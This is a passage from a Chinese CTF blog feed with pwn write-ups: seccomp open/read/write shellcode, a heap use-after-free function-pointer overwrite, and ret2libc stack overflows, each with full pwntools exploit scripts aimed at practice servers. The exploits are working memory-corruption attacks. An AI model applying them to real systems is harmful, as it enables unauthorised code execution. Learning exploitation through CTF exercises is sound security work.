        <content type="html"><![CDATA[<p>prctl 内核沙箱机制</p><span id="more"></span><h2 id="知识点"><a class="markdownIt-Anchor" href="#知识点">#</a> 知识点</h2><p>prctl seccomp 相当于内核中的一种安全机制，正常情况下，程序可以使用所有的 syscall，但是当劫持程序流程之后通过 exeve 来呼叫 syscall 得到 shell 时过滤掉某些 syscall，只允许使用部分 syscall。</p><p>seccomp 是 secure computing 的缩写，其是 Linux kernel 从 2.6.23 版本引入的一种简洁的 sandboxing 机制。在 Linux 系统里，大量的系统调用（system call）直接暴露给用户态程序。但是，并不是所有的系统调用都被需要，而且不安全的代码滥用系统调用会对系统造成安全威胁。seccomp 安全机制能使一个进程进入到一种 “安全” 运行模式，该模式下的进程只能调用 4 种系统调用（system call），即 read (), write (), exit () 和 sigreturn ()，否则进程便会被终止。</p><h2 id="wp"><a class="markdownIt-Anchor" href="#wp">#</a> WP</h2><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111172023579.png" alt="image-20211117202323531"></p><p>开启了 canary</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111172031319.png" alt="image-20211117203126264"></p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111172032512.png" alt="image-20211117203205447"></p><p>本题系统内核只允许使用 sys_open，sys_read，sys_write</p><p>第一次调用 prctl 函数 禁止提权，第二次调用 prctl 函数 限制能执行的系统调用只有 open，write，exit</p><p>总体思路是：open flag -&gt;read-&gt;write</p><ol><li>sys_open</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">push <span class="number">0x0</span>  <span class="comment">#字符串结尾</span></span><br><span class="line">push <span class="number">0x67616c66</span><span class="comment">#&#x27;flags&#x27;</span></span><br><span class="line">mov ebx,esp</span><br><span class="line">xor ecx,ecx<span class="comment">#0</span></span><br><span class="line">xor edx,edx<span class="comment">#0</span></span><br><span class="line">mov eax,<span class="number">0x5</span><span class="comment">#调用号</span></span><br><span class="line"><span class="built_in">int</span> <span class="number">0x80</span><span class="comment">#sys_open(flags,0,0)</span></span><br></pre></td></tr></table></figure><ol start="2"><li><p>sys_read (2,file,0x100) 系统调用号为 3</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov eax,<span class="number">0x3</span>; </span><br><span class="line">mov ecx,ebx;<span class="comment"># ecx = char __user *buf 缓冲区，读出的数据--&gt;也就是读“flag”</span></span><br><span class="line">mov ebx,<span class="number">0x3</span>;<span class="comment"># 文件描述符 fd:是文件描述符 0 1 2 3 代表标准的输出输入和出错,其他打开的文件</span></span><br><span class="line">mov edx,<span class="number">0x100</span>;<span class="comment">#对应字节数</span></span><br><span class="line"><span class="built_in">int</span> <span class="number">0x80</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="3"><li>sys_write (1,file,0x30) 系统调用号为 4</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov eax,<span class="number">0x4</span>;<span class="comment"># eax = sys_write</span></span><br><span class="line">mov ebx,<span class="number">0x1</span>;<span class="comment"># ebx = unsigned int fd = 1</span></span><br><span class="line"><span class="built_in">int</span> <span class="number">0x80</span>;</span><br></pre></td></tr></table></figure><p>exp:</p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn  <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28836</span>)</span><br><span class="line">shellcode=<span class="string">&quot;&quot;</span></span><br><span class="line">shellcode += asm(<span class="string">&#x27;xor ecx,ecx;mov eax,0x5; push ecx;push 0x67616c66; mov ebx,esp;xor edx,edx;int 0x80;&#x27;</span>)</span><br><span class="line">shellcode += asm(<span class="string">&#x27;mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov dl,0x30;int 0x80;&#x27;</span>)</span><br><span class="line">shellcode += asm(<span class="string">&#x27;mov eax,0x4;mov bl,0x1;mov edx,0x30;int 0x80;&#x27;</span>)</span><br><span class="line">recv = p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">flag = p.recv(<span class="number">100</span>)</span><br><span class="line"><span class="built_in">print</span> flag</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28836</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;orw&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="string">&#x27;eax&#x27;</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">100</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">100</span>)</span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line"></span><br><span class="line">r.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwnable.tw </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>堆漏洞uaf</title>
      <link href="/2021/11/17/hitcontraining_uaf/"/>
      <url>/2021/11/17/hitcontraining_uaf/</url>
      
        <content type="html"><![CDATA[<p>uaf</p><span id="more"></span><h2 id="知识点"><a class="markdownIt-Anchor" href="#知识点">#</a> 知识点</h2><p>UAF 漏洞全称为 use after free，即释放后重用。漏洞产生的原因，在于内存在被释放后，但是指向指针并没有被删除，又被程序调用。比较常见的类型是 C<ins> 对象，利用 UAF 修改 C</ins> 的虚函数表导致的任意代码执行。</p><h2 id="例题"><a class="markdownIt-Anchor" href="#例题">#</a> 例题</h2><h3 id="buuctfpwnhitcontraining_uaf"><a class="markdownIt-Anchor" href="#buuctfpwnhitcontraining_uaf">#</a> [BUUCTF]PWN——hitcontraining_uaf</h3><ol><li>checksec 检查，开了 NX 保护，32 位</li></ol><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111171548682.png" alt="image-20211117154838315"></p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111171549415.png" alt="image-20211117154930218"></p><p>(1) add note</p><p><img src="https://img-blog.csdnimg.cn/20210602182659998.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTU1NjQ0MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>add 会申请两次内存，第一次申请 8 个字节，前四个字节指向 print_note_content 这个函数，后四个字节指向我们写入的字符串 (count 会加 1)</p><p>(2) delete note</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111171557904.png" alt="image-20211117155714676"></p><p>只释放了堆块里的内容但没有将指针置 0，存在 uaf 漏洞，并未指向 NULL</p><p>(3)  print note</p><p><img src="https://img-blog.csdnimg.cn/2020090722450461.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21jbXV5YW5nYQ==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>调用 add 申请的第一个 8 个字节中的前四个字节指向的函数，打印 add 创建的第二个 chunk 里的值</p><p><img src="https://img-blog.csdnimg.cn/20200907225210334.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21jbXV5YW5nYQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>（4） shell</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111171626096.png" alt="image-20211117162634035"></p><p>fastbin 是单向链表遵循先进后出原则，申请 A,B 两个堆块后，先释放 A ，后释放 B，会在 fastbin 里形成链，此时，再次申请一个大小为 0x8 的内存 C，并写入 shellcode 地址，那么第一个 8 个字节 C 就指向 B，第二个 8 个字节 C 指向 A，这时候我们写入的内容就会覆盖原有的，但原来的指针仍指向它，因而可以更改 print_note_content 函数为我们想要执行的函数。</p><p>在 add 中，我们只能对 content 部分进行操作，无法对 print_note_content 对应的部分即 put 段进行操作，所以我们要想办法，操作 put 段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">根据put段和content段中大小的不同，如果要申请到put段，payload大小应该为0x8，由于先进后出原则，先释放A，后释放B，此时第三次申请的put段指向B的put，content段指向A的put，content写入magic，调用print_note(0)时就调用了magic</span><br></pre></td></tr></table></figure><p>申请过程堆块变化：<br>add:</p><p><img src="https://img-blog.csdnimg.cn/2020090723023881.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21jbXV5YW5nYQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>free 后：<br><img src="https://img-blog.csdnimg.cn/20200907230643335.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21jbXV5YW5nYQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>再次申请，写入 shell<br><img src="https://img-blog.csdnimg.cn/20200907231047979.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21jbXV5YW5nYQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>先进后出原则</p><p>wp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./hacknote&#x27;</span>)</span><br><span class="line"><span class="comment"># r = remote(&#x27;node4.buuoj.cn&#x27;,27609)</span></span><br><span class="line">shell_add = <span class="number">0x8048945</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">  r.sendlineafter(<span class="string">&#x27;choice :&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">  r.sendlineafter(<span class="string">&#x27;Note size :&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">  r.sendlineafter(<span class="string">&#x27;Content :&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">  r.sendlineafter(<span class="string">&#x27;choice :&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">  r.sendlineafter(<span class="string">&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printf</span>(<span class="params">idx</span>):</span><br><span class="line">  r.sendlineafter(<span class="string">&#x27;choice :&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">  r.sendlineafter(<span class="string">&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">48</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">48</span>,<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>,p32(shell_add))</span><br><span class="line">printf(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#第二种思路double free</span></span><br><span class="line"><span class="comment">#add(8,&#x27;aaaa&#x27;)</span></span><br><span class="line"><span class="comment">#delete(0)</span></span><br><span class="line"><span class="comment">#delete(0)</span></span><br><span class="line"><span class="comment">#add(40,&#x27;aaaa&#x27;)</span></span><br><span class="line"><span class="comment">#add(8,p32(shell_addr))</span></span><br><span class="line"><span class="comment">#printf(1)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="参考文章"><a class="markdownIt-Anchor" href="#参考文章">#</a> 参考文章</h2><p><a href="https://blog.csdn.net/mcmuyanga/article/details/108454183?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163714805316780261940769%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=163714805316780261940769&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2">https://blog.csdn.net/mcmuyanga/article/details/108454183?ops_request_misc=%7B%22request%5Fid%22%3A%22163714805316780261940769%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=163714805316780261940769&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2</a><sub>all</sub>sobaiduend~default-2-108454183.first_rank_v2_pc_rank_v29&amp;utm_term=hitcontraining_uaf&amp;spm=1018.2226.3001.4187</p><p><a href="https://www.anquanke.com/post/id/190589">IE 漏洞学习笔记（二）：UAF 释放后重用</a></p><p><a href="https://www.anquanke.com/post/id/176694">One_gadget 和 UAF 结合利用堆溢出漏洞研究</a></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>栈溢出</title>
      <link href="/2021/11/16/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
      <url>/2021/11/16/%E6%A0%88%E6%BA%A2%E5%87%BA/</url>
      
        <content type="html"><![CDATA[<p>ret2libc，fmtstr</p><span id="more"></span><h2 id="一-基础知识补充"><a class="markdownIt-Anchor" href="#一-基础知识补充">#</a> 一。基础知识补充</h2><ol><li><p>指令指针寄存器，是存放下次将要执行的指令在代码段的偏移量，RIP、EIP、IP (Instruction Pointer) 分别为 64 位、32 位、16 位指令指针寄存器</p></li><li><p>以 64 位程序为例:</p><p>在执行 call 指令的时候，会向栈中压入 call 指令完成后下一条指令的地址，之后跳转到被调用的函数开始执行</p><p>push rbp ; 将父函数栈底压入栈中<br>mov rbp, rsp ; 将父函数栈顶变为子函数栈底<br>sub rsp, 0x70 ; 向低地址处为子函数开辟栈帧</p><p>在函数调用结束的时候，程序会执行这两条指令<br>leave 指令相当于执行了如下两条指令<br>mov esp ebp<br>pop ebp</p><p>ret 指令则可以理解为将栈中的返回地址 pop 给 rip 的操作，从而回到父函数继续执行</p></li></ol><h2 id="二-ret2text"><a class="markdownIt-Anchor" href="#二-ret2text">#</a> 二. ret2text</h2><p>栈溢出函数：strcpy</p><p>程序本身存在 fflush 函数，我们可以直接用它的 sh 来当作 system 的参数</p><h2 id="三-ret2libc"><a class="markdownIt-Anchor" href="#三-ret2libc">#</a> 三. ret2libc</h2><h3 id="泄露libc利用思路"><a class="markdownIt-Anchor" href="#泄露libc利用思路">#</a> 泄露 libc 利用思路：</h3><ol><li>利用 write 函数来泄露程序的 libc 版本</li><li>知道 libc 版本后去计算程序里的 system 函数和字符串 “/bin/sh” 的地址</li><li>覆盖返回地址为 system（‘/bin/sh’），获取 shell</li></ol><h3 id="例题2018_rop"><a class="markdownIt-Anchor" href="#例题2018_rop">#</a> 例题：2018_rop</h3><p><img src="https://img-blog.csdnimg.cn/20201006145006742.png#pic_center" alt="在这里插入图片描述"></p><p><code>1:</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(write_plt)+p32(main)+p32(<span class="number">0</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">write_addr=u32(r.recv(<span class="number">4</span>)) <span class="comment"># 获取write函数地址</span></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>首先填充‘a’*（0x88+4）造成溢出，覆盖到返回地址，返回地址填上 write 函数的 plt 地址来调用 write 函数，之后跟上 main 函数地址（我们要将程序程序重新执行一遍，再次利用输入点来进构造 rop）<br>p32（0）+p32 (write_addr)+p32 (4) 是在设置 write 函数的参数，对应函数原型看一下，32 位程序是 4 位，所以这边写的 4，对应的 64 位程序是 8 位。</p><p><code>2:</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">offset=write_addr-libc.dump(<span class="string">&#x27;write&#x27;</span>)     <span class="comment">#计算偏移量</span></span><br><span class="line">                                <span class="comment">#偏移量=程序里的函数地址-libc里的函数地址</span></span><br><span class="line">system_addr=offset+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh=offset+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br></pre></td></tr></table></figure><p><code>3:</code></p><p>构造 rop 获取 shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(system_addr)+p32(<span class="number">0</span>)+p32(bin_sh)</span><br></pre></td></tr></table></figure><p>完整 exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27043</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./2018_rop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(write_plt)+p32(main)+p32(<span class="number">0</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">write_addr=u32(r.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">offset=write_addr-libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system_addr=offset+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh=offset+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(system_addr)+p32(<span class="number">0</span>)+p32(bin_sh)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>但是我在这么写的时候出现了  <code>timeout: the monitored command dumped core</code> , 尝试泄露 read 函数的真实地址，再调用 read 函数来找到偏移。(后来找到问题有：payload 的顺序错误也会导致 timeout 和找不到 libc,timeout 对应 payload: 填充 + got 表 + plt 表 + main，找不到 libc 对应 payload: 填充 + pop_rdi_ret+binsh_system, 对应 64 位栈溢出，32 位和 64 位不同)</p><p>64 位查找 pop_rdi:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary bjdctf_2020_babyrop |grep <span class="string">&quot;pop rdi&quot;</span></span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">&quot;./2018_rop&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">28628</span>)</span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x080484C6</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x88</span> + <span class="number">0x4</span>) </span><br><span class="line">payload += p32(write_plt) + p32(main_addr)</span><br><span class="line">payload += p32(<span class="number">1</span>) + p32(read_got) + p32(<span class="number">8</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">read_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(read_addr)</span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;read&quot;</span>, read_addr)</span><br><span class="line">libc_base = read_addr - libc.dump(<span class="string">&quot;read&quot;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">binsh = libc_base + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x88</span> + <span class="number">0x4</span>)</span><br><span class="line">payload += p32(sys_addr) + p32(<span class="number">0</span>) + p32(binsh)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>LibcSearcher 使用方法：将 exp 放在 libcsearcher 的安装目录下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="string">&#x27;25295&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./1&#x27;</span>)</span><br><span class="line">main=<span class="number">0x400b28</span></span><br><span class="line">rdi=<span class="number">0x400c83</span></span><br><span class="line">ret=<span class="number">0x4006b9</span></span><br><span class="line">pus_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your choice!\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">payload=<span class="string">&#x27;\0&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x50</span>-<span class="number">1</span>+<span class="number">8</span>)+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your Plaintext to be encrypted\n&#x27;</span>,payload)</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()　　　　<span class="comment">#接收 encrypt  的两个 puts函数输出;</span></span><br><span class="line">puts_addr=u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))  <span class="comment">#得到 puts 函数 的地址;</span></span><br><span class="line">libc=LibcSearcher(<span class="string">&quot;puts&quot;</span>,puts_addr)       <span class="comment"># 得到 libc的版本;</span></span><br><span class="line">libc_base=puts_addr-libc.dump(<span class="string">&quot;puts&quot;</span>)     <span class="comment">#    得到偏移地址</span></span><br><span class="line">sys_addr=libc_base+libc.dump(<span class="string">&quot;system&quot;</span>)     <span class="comment">#  利用偏移地址 得到 system函数的地址</span></span><br><span class="line">binsh=libc_base+libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)     <span class="comment">#               得到  bin/sh 的 地址</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice!\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)      <span class="comment">#   再一次执行 一遍流程</span></span><br><span class="line">payload=<span class="string">&#x27;\0&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x50</span>-<span class="number">1</span>+<span class="number">8</span>)+p64(ret)+p64(rdi)+p64(binsh)+p64(sys_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;encrypted\n&#x27;</span>,payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>plt 表 -》got 表</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111170953007.png" alt="image-20211117095319554"></p><h2 id="四-利用mprotect修改内存权限"><a class="markdownIt-Anchor" href="#四-利用mprotect修改内存权限">#</a> 四。利用 mprotect 修改内存权限</h2><p>mprotect 函数，可以用它来修改我们，内存栈的权限，让它可读可写可执行，进而修改内存权限。</p><h3 id="ropgadget使用"><a class="markdownIt-Anchor" href="#ropgadget使用">#</a> ROPgadget 使用</h3><p>例题：not_the_same_3dsctf_2016</p><p>利用 <code>mprotect</code>  函数修改 bss 段为 <code>0x7</code>  即 <code>0b111</code> ，可读可写可执行权限，然后利用 read 函数读入 shellcode，最后跳转到 shellcode 的位置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 